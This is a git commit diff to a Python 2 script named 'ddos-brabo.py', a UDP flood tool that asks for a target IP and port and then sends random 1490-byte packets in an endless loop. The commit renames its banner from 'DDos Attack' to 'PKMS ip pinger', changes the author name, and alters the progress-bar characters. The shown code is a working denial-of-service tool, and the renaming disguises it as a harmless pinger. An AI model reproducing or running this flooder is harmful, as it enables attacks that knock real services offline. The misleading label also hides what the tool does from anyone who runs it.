508f3dfd8f3558f94a1ceb35d528dbf3e47b6bc0
HB-117 <86242252+HB-117@users.noreply.github.com>
2021-07-08 15:40:12 -0300

    Update ddos-brabo.py

--- ddos-brabo.py
+++ ddos-brabo.py
@@ -1,3 +1,4 @@
+
 import sys
 import os
 import time
@@ -18,9 +19,9 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet DDos Attack")
+os.system("figlet PKMS ip pinger")
 print
-print "Author   : HB-117"
+print "Author   : russo3-1"
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
@@ -29,13 +30,13 @@ os.system("clear")
 os.system("figlet Attack Starting")
 print "[                    ] 0% "
 time.sleep(5)
-print "[=====               ] 25%"
+print "[xxxxx               ] 25%"
 time.sleep(5)
-print "[==========          ] 50%"
+print "[xxxxxxxxxx          ] 50%"
 time.sleep(5)
-print "[===============     ] 75%"
+print "[xxxxxxxxxxxxxxx     ] 75%"
 time.sleep(5)
-print "[====================] 100%"
+print "[xxxxxxxxxxxxxxxxxxxx] 100%"
 time.sleep(3)
 sent = 0
 while True:
@@ -45,4 +46,3 @@ while True:
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
-
